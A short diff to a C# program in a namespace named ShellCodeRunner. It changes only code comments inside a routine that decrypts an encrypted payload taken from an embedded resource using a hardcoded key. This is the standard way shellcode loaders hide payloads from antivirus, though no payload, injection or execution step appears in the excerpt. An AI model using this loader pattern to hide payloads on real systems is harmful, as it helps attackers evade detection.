@@ -21,7 +21,7 @@ namespace ShellCodeRunner
     {
         static byte[] GetAllDecryptedBytes()
         {
-            //Encryption Key
+            //Decryption Key.  Ensure it is the same as your Encryption key
             char[] key = { 'p', 'a', 's', 's', 'k', 'e', 'y' };
 
             // Get the encrypted payload from the embedded resource
@@ -30,7 +30,7 @@ namespace ShellCodeRunner
             // New byte array to hold decrypet payload bytes
             byte[] newByte = new byte[encBytes.Length];
 
-            // index for the encryption key
+            // index for the decryption key
             int j = 0;
 
             // Loop through each byte of the encrypted payload
